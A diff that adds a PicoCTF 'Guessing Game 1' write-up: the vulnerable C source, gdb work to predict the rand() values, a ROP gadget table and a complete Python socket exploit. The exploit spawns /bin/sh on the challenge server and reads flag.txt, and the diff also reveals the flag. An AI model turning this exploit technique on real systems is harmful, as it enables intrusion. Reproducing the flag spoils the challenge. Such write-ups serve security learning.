@@ -1,4 +1,4 @@
-# [PicoCTF](./picoctf.md) Binary Exploitation [2/22]
+# [PicoCTF](./picoctf.md) Binary Exploitation [3/22]
 
 Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker.
 
@@ -7,7 +7,7 @@ Binary exploitation is the process of subverting a compiled application such tha
 - [seed-sPRiNG (2019)](#seed-spring)
 - [sice_cream (2019)](#sice-cream)
 - [zero_to_hero (2019)](#zero-to-hero)
-- [Guessing Game 1 (2020)](#guessing-game-1)
+- [Guessing Game 1 (2020)](#guessing-game-1) 🗸
 - [Guessing Game 2 (2020)](#guessing-game-2)
 - [Stonks (2021)](#stonks) 🗸
 - [Cache Me Outside (2021)](#cache-me-outside)
@@ -197,10 +197,220 @@ I made a simple game to show off my programming skills. See if you can beat it! 
 
 <details>
 
-<summary markdown="span">Solution 1</summary>
+<summary markdown="span">Solution</summary>
 
-solution details
+Reviewing the source code we can see a program that receives a user input, compares to a "random" number and processes a win or a loss:
+	
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 
+#define BUFSIZE 100
+
+
+long increment(long in) {
+	return in + 1;
+}
+
+long get_random() {
+	return rand() % BUFSIZE;
+}
+
+int do_stuff() {
+	long ans = get_random();
+	ans = increment(ans);
+	int res = 0;
+	
+	printf("What number would you like to guess?\n");
+	char guess[BUFSIZE];
+	fgets(guess, BUFSIZE, stdin);
+	
+	long g = atol(guess);
+	if (!g) {
+		printf("That's not a valid number!\n");
+	} else {
+		if (g == ans) {
+			printf("Congrats! You win! Your prize is this print statement!\n\n");
+			res = 1;
+		} else {
+			printf("Nope!\n\n");
+		}
+	}
+	return res;
+}
+
+void win() {
+	char winner[BUFSIZE];
+	printf("New winner!\nName? ");
+	fgets(winner, 360, stdin);
+	printf("Congrats %s\n\n", winner);
+}
+
+int main(int argc, char **argv){
+	setvbuf(stdout, NULL, _IONBF, 0);
+	// Set the gid to the effective gid
+	// this prevents /bin/sh from dropping the privileges
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+	
+	int res;
+	
+	printf("Welcome to my guessing game!\n\n");
+	
+	while (1) {
+		res = do_stuff();
+		if (res) {
+			win();
+		}
+	}
+	
+	return 0;
+}
+~~~
+
+We can decompile the vuln binary in ghidra to find the two registers used for the comparison:
+
+~~~
+undefined8        Stack[-0x18]:8 local_18                                XREF[4]:     00400bac(W), 
+...
+00400c14 48 3b 45 f0     CMP        RAX,qword ptr [RBP + local_18]
+~~~
+
+Running in gdb, we can set a breakpoint at atol to review the registers:
+
+~~~
+$ chmod +x vuln
+$ gdb vuln
+(gdb) b atol
+Breakpoint 1 at 0x40dd60
+(gdb) r
+Starting program: /home/derek/Downloads/vuln 
+Welcome to my guessing game!
+
+What number would you like to guess?
+1
+
+Breakpoint 1, 0x000000000040dd60 in atol ()
+~~~
+
+At this breakpoint we can find the regsiters with our input and the register of the random number:
+
+~~~
+(gdb) x/s $rdi
+0x7fffffffd5a0:	"1\n"
+(gdb) x/s $rax
+0x7fffffffd5a0:	"1\n"
+(gdb) x/s $rbp - 0x18 + 8
+0x7fffffffd610:	"T"
+~~~
+
+rerunning we get the same random number.  continuing after the breakpoint, the random number changes.  After investigating, the random number appears to step through the following integers:
+
+~~~
+84
+87
+78
+16
+94
+36
+...
+~~~
+
+Using this we can get to the win() function:
+
+~~~
+(gdb) c
+Continuing.
+Congrats! You win! Your prize is this print statement!
+
+New winner!
+Name? 
+~~~
+
+Reviewing the source code we can see the fgets accepts up to 360 bytes but the variable buffer only holds 100 bytes.  We can therefore inject a buffer overflow. We can generate a ROP chain using ROPgadget detailed below:
+
+| Detail       | Payload                            |
+|--------------|------------------------------------|
+| Offset       | 120 chars                          |
+| POP $RAX     | '\xf4\x63\x41\x00\x00\x00\x00\x00' |
+| Syscall      | '\x2f\x62\x69\x6e\x2f\x73\x68\x00' |
+| POP $RSI     | '\xa3\x0c\x41\x00\x00\x00\x00\x00' |
+| DATA Add     | '\xa0\xc3\x6b\x00\x00\x00\x00\x00' |
+| $RSI - $RAX  | '\x91\xff\x47\x00\x00\x00\x00\x00' |
+| POP $RAX     | '\xf4\x63\x41\x00\x00\x00\x00\x00' |
+| Execv        | '\x3b\x00\x00\x00\x00\x00\x00\x00' |
+| POP $RDI     | '\x96\x06\x40\x00\x00\x00\x00\x00' |
+| DATA Add     | '\xa0\xc3\x6b\x00\x00\x00\x00\x00' |
+| POP $RSI     | '\xa3\x0c\x41\x00\x00\x00\x00\x00' |
+| NULL         | '\x00\x00\x00\x00\x00\x00\x00\x00' |
+| POP $RDX     | '\xb5\xa6\x44\x00\x00\x00\x00\x00' |
+| NULL         | '\x00\x00\x00\x00\x00\x00\x00\x00' |
+| Syscall      | '\x7c\x13\x40\x00\x00\x00\x00\x00' |
+|--------------|------------------------------------|
+
+We can put this together in Python to exploit the challenge server:
+
+~~~py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Created on Sun Jan 30 13:21:06 2022
+
+@author: derek
+"""
+
+from pwn import *
+import socket
+import time
+
+payload = b"a"*120
+payload += b'\xf4\x63\x41\x00\x00\x00\x00\x00'
+payload += b'\x68\x73\x2f\x6e\x69\x62\x2f\x00'
+payload += b'\xa3\x0c\x41\x00\x00\x00\x00\x00'
+payload += b'\xa0\xc3\x6b\x00\x00\x00\x00\x00'
+payload += b'\x91\xff\x47\x00\x00\x00\x00\x00'
+payload += b'\xf4\x63\x41\x00\x00\x00\x00\x00'
+payload += b'\x3b\x00\x00\x00\x00\x00\x00\x00'
+payload += b'\x96\x06\x40\x00\x00\x00\x00\x00'
+payload += b'\xa0\xc3\x6b\x00\x00\x00\x00\x00'
+payload += b'\xa3\x0c\x41\x00\x00\x00\x00\x00'
+payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+payload += b'\xb5\xa6\x44\x00\x00\x00\x00\x00'
+payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'
+payload += b'\x7c\x13\x40\x00\x00\x00\x00\x00'
+
+URL = "jupiter.challenges.picoctf.org"
+PORT = 28953
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((URL, PORT))
+print("connected to challenge server")
+time.sleep(1)
+recvbuff = s.recv(1000).decode()
+print(recvbuff)
+s.send(b"84\n")
+time.sleep(1)
+recvbuff = s.recv(1000).decode()
+print(recvbuff)
+s.send(payload + b"\n")
+time.sleep(1)
+recvbuff = s.recv(1000)
+print(recvbuff)
+s.send(b"ls\n")
+time.sleep(1)
+recvbuff = s.recv(1000)
+print(recvbuff)
+s.send(b"cat flag.txt\n")
+time.sleep(1)
+recvbuff = s.recv(1000)
+print(recvbuff)
+~~~
+
+This returns the flag.
+	
 </details>
 
 ### Answer
@@ -210,7 +420,7 @@ solution details
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}
 ~~~
 
 </details>
